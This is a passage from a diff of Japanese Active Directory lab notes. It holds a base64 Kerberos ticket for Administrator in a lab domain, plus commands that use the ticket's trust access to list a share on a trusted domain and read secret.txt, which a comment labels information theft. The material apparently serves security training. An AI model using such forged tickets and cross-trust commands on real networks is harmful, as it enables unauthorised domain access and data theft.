Of4UhQR3QsikRa08L3CgFSCbLWClHIIOZeJM/CxxFu0Fh1JkEPQbEOOIRcpwxCddWhe2S3NNj7j+C44DcMmkh1sFHL2VMCX1Ru9h/6WgDtEn1YW2i3XiMrK60YRxO8QW1JPqAg4EPT8LMLVWI3QqRzP5353gAqUFpLxibBIvTgsE6IUGOGuVWqdPpxY1uN//rTIyiIOKI/W0VxrLlC8vyuSmiX86cy9Jc1Myw4V4EggTDkj0iewtbCOs1Em0rpd0o3HNxxup9mNKZDh79SslHGRdT+2TCfrGdmmotLam0K3Fe0yW6mmAvrBWLtNX+YQl0rC9OorKQsHR2O6iAFe1tcD/4Wi78uoBG0fCIhd1RCpcBE80OJewYRMWR1M3QlS2+m7I+RT/yftKvDwJDuTHTs/etnhMlYXeXrql5PYZ6GTq48T5Zj07k+uSjseswwptc1TmyQKa/GaMk+e+5rAkhtCGNlnvNpfL+2k1DfKyUyrqYok87MyRC15Gz0JlT8SZmKK6dWWwES66aviRjJV95nL9nr2BeAuLlGIJPxnjvCkiPTi3HTszHw7wXxoz31DanuNxF3UUeX5xeuqcrqskQi+4yHz2jklPxvO+BkbJgiJmNgC5+TZMN0jYRUsZqgPQ38trDDjYaMNlVUgKcwRmOQfwXiAhsqOnw6NuKmQTBSYSgjoH4Y5WbTX2/bcrVNFSFdyG/2GZRgbNKjxNffsRoo1EpTMcvN254EkZlz4u9f58g6sW+s/DfWwulpYFjTl6Jxe/4Xjo/M4Wxg2nJj8NoaXUKy0mfYo7GQeksNFchNqbpRAE+w7CpcW+GgxAjxY8MQhk8dqJU0Fnp+qfLyRtDUEU+E8Gxug39SA968TaiPrVJkP3XjzYbAIzL3cgW09M89LooAyvpIk0VsnDnL88UJqQGj5RcL6z4VlYMn+RL1WdQld5fcrvTwrAFsGRLVKhoiGCNtMRosgP6gug9sx9iaghYDc7tgntYdvhKmxq9DK4AVUTGSkk1c1x41pNo4IBHjCCARqgAwIBAKKCAREEggENfYIBCTCCAQWgggEBMIH+MIH7oBswGaADAgEXoRIEENecUduvdz8TQSjF1sTS8rChHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoAAApBEYDzIwMjYwMTA3MTIzNDM1WqURGA8yMDI2MDEwNzEyMzQzNVqmERgPMjAyNjAxMDcyMjM0MzVapxEYDzIwMjYwMTE0MTIzNDM1WqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUw=		
+# 使用しているRC4に間違いがないのにKRBERROR(31)が発生する場合はメールする。
 
-dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\	# 外部信頼ドメインの共有リソースにアクセス
+# 外部信頼ドメインの共有リソースにアクセス
+dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\	
 
-type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt	# secret.txtの情報窃取
+# secret.txtの情報窃取
+type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt	
 ```
